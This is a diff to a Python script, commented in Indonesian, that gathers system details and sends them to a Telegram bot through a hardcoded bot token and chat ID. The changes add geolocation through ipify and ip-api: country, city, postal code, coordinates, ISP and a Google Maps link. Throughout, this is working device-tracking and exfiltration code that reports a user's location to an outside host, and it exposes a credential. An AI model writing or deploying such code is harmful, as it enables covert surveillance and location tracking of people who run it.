@@ -3,22 +3,43 @@ import socket
 import platform
 import uuid
 import re
+import json
 
 # Konfigurasi Bot Telegram
 BOT_TOKEN = "8115407226:AAEOHx-HOK_1GyMhL4lxVpyP_qncyzmbeGw"
 CHAT_ID = "-4734661201"  # Isi dengan chat ID Anda (biarkan kosong untuk dicari otomatis)
 
 def get_device_info():
-    """Mengumpulkan informasi perangkat"""
+    """Mengumpulkan informasi perangkat dan lokasi"""
     try:
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
         
-        # Mencari alamat IP eksternal jika memungkinkan
+        # Mencari alamat IP eksternal dan lokasi
         try:
             external_ip = requests.get('https://api.ipify.org').text
-        except:
-            external_ip = "Tidak dapat diperoleh"
+            geo_data = requests.get(f'http://ip-api.com/json/{external_ip}').json()
+            
+            location_info = {
+                "IP Eksternal": external_ip,
+                "Negara": geo_data.get('country', 'Tidak diketahui'),
+                "Kode Negara": geo_data.get('countryCode', 'Tidak diketahui'),
+                "Region": geo_data.get('regionName', 'Tidak diketahui'),
+                "Kota": geo_data.get('city', 'Tidak diketahui'),
+                "Kode Pos": geo_data.get('zip', 'Tidak diketahui'),
+                "Latitude": geo_data.get('lat', 'Tidak diketahui'),
+                "Longitude": geo_data.get('lon', 'Tidak diketahui'),
+                "Zona Waktu": geo_data.get('timezone', 'Tidak diketahui'),
+                "ISP": geo_data.get('isp', 'Tidak diketahui'),
+                "Organisasi": geo_data.get('org', 'Tidak diketahui'),
+                "AS": geo_data.get('as', 'Tidak diketahui')
+            }
+        except Exception as geo_error:
+            print(f"Error mendapatkan lokasi: {geo_error}")
+            location_info = {
+                "IP Eksternal": "Tidak dapat diperoleh",
+                "Lokasi": "Gagal mendapatkan data lokasi"
+            }
         
         info = {
             "Sistem Operasi": platform.system(),
@@ -27,11 +48,14 @@ def get_device_info():
             "Processor": platform.processor(),
             "Versi OS": platform.version(),
             "IP Lokal": ip_address,
-            "IP Eksternal": external_ip,
-            "MAC Address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
             "Platform": platform.platform(),
-            "Python Version": platform.python_version()
+            "Python Version": platform.python_version(),
+            **location_info
         }
+        
+        # Tambahkan link Google Maps jika koordinat tersedia
+        if 'Latitude' in info and 'Longitude' in info and info['Latitude'] != 'Tidak diketahui':
+            info["Peta Google"] = f"https://www.google.com/maps?q={info['Latitude']},{info['Longitude']}"
         
         return info
     except Exception as e:
@@ -81,7 +105,7 @@ def main():
     device_info = get_device_info()
     
     # Format pesan untuk Telegram
-    message = "<b>📊 Informasi Perangkat</b>\n\n"
+    message = "<b>📊 Informasi Perangkat dan Lokasi</b>\n\n"
     for key, value in device_info.items():
         message += f"<b>{key}:</b> {value}\n"
     
@@ -90,5 +114,5 @@ def main():
     print(result)
 
 if __name__ == "__main__":
-    print("Mengumpulkan informasi perangkat dan mengirim ke Telegram...")
+    print("Mengumpulkan informasi perangkat dan lokasi, mengirim ke Telegram...")
     main()
